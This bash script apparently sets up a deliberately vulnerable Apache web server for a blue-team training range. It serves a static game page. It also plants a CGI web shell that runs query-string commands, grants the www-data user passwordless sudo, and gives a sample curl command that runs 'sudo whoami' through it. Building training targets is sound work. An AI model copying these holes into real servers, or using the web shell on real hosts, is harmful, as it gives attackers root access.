#! /bin/bash

# Name: httpd Install
# Notes: 
# - Hosts simple static site
# - Insecure CGI script allows remote command execution
# - Run commands with:
#   -  curl -X POST "host:80/cgi-bin/magic.cgi?comm=sudo%20whoami"
# Valid Targets: Blue team debian based images

echo "Installing httpd..."

echo "apt update and install..."
sudo apt update
sudo apt install -y apache2

CONFIG="DefaultRuntimeDir \${APACHE_RUN_DIR}

PidFile \${APACHE_PID_FILE}

Timeout 300

KeepAlive On

MaxKeepAliveRequests 100

KeepAliveTimeout 5


User \${APACHE_RUN_USER}
Group \${APACHE_RUN_GROUP}

HostnameLookups Off

ErrorLog \${APACHE_LOG_DIR}/error.log

LogLevel warn

IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf

Include ports.conf


<Directory />
	Options FollowSymLinks
	AllowOverride None
	Require all denied
</Directory>

<Directory /usr/share>
	AllowOverride None
	Require all granted
</Directory>

<Directory /var/www/>
	Options Indexes FollowSymLinks
	AllowOverride None
	Require all granted
</Directory>

ScriptAlias /cgi-bin/ /var/cgi-bin/
<Directory \"/var/cgi-bin\">
   AllowOverride None
   Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
   Require all granted
</Directory>
<Directory /srv/>
	Options Indexes FollowSymLinks
	AllowOverride None
	Require all granted
</Directory>




AccessFileName .htaccess

<FilesMatch \"^\.ht\">
	Require all denied
</FilesMatch>


LogFormat \"%v:%p %h %l %u %t \\\"%r\\\" %>s %O \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\"\" vhost_combined
LogFormat \"%h %l %u %t \\\"%r\\\" %>s %O \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\"\" combined
LogFormat \"%h %l %u %t \\\"%r\\\" %>s %O\" common
LogFormat \"%{Referer}i -> %U\" referer
LogFormat \"%{User-agent}i\" agent


IncludeOptional conf-enabled/*.conf

IncludeOptional sites-enabled/*.conf"

echo "Creating config file..."
echo "$CONFIG" | sudo tee /etc/apache2/apache2.conf > /dev/null

echo "Enable CGI scripts..."
sudo a2enmod cgi.load

echo "Updating www-data permissons..."
echo "www-data ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers > /dev/null

HOME="<html><head>
<meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1252\"><style>
	body
	{
		background-color: #12152b;
	}
	.title
	{
		color: #10d117;
		font-size: 48px;
		font-family: \"arial\";
		text-align: center;
	}
	.subtitle
	{
		color: #10d117;
		font-size: 32px;
		font-family: \"arial\";
		text-align: center;
	}
	button
	{
		border: none;
		border-radius: 12px;
		background-color: #10d117;
		padding: 12px 24px;
		text-align: center;
		display: inline-block;
		font-size: 26px;
	}
	button:hover
	{
		box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);
	}
	button:active
	{
		background-color: #0dbc13;
		box-shadow: 0 5px #666;
		transform: translateY(4px);
	}
	.wrapper
	{
		text-align: center;
		padding-top: 32px;
	}
	</style>
	</head><body class=\"title\" style=\"padding-top: 20px\">
	Welcome to the Range!
	
	<script type=\"text/javascript\">
	var clicks = 0;
	function onClick() {
		clicks += Math.floor((Math.random() * 10) + 1);
		var text = clicks.toString();
		if (clicks >= 1000) {
			document.getElementById(\"win\").hidden = false;
		}
		document.getElementById(\"clicks\").innerHTML = text;
	};
	</script>
	<div class=\"wrapper\">
		<button type=\"button\" onclick=\"onClick()\">Play</button>
	</div>
	<p class=\"subtitle\">Score: <a id=\"clicks\">0</a></p>
	<div id=\"win\" hidden=\"\">
		<p class=\"subtitle\">You Win!</p>
	</div>

</body></html>"

echo "$HOME" | sudo tee /var/www/html/index.html > /dev/null

CGI="#!/bin/bash
function urldecode() { : \"\${*//+/ }\"; echo -e \"\${_//%/\\x}\"; }

echo \"Content-type: text/html\"
echo \"\"

COMM=\$(echo \$QUERY_STRING | cut -d = -f 2)
COMM=\$(urldecode \$COMM)
echo \"<pre>\"
\$COMM 2>&1
echo \"</pre>\""

sudo mkdir /var/cgi-bin
echo "$CGI" | sudo tee /var/cgi-bin/magic.cgi > /dev/null

echo "Enabling service..."
sudo systemctl enable apache2

echo "Done installing httpd."
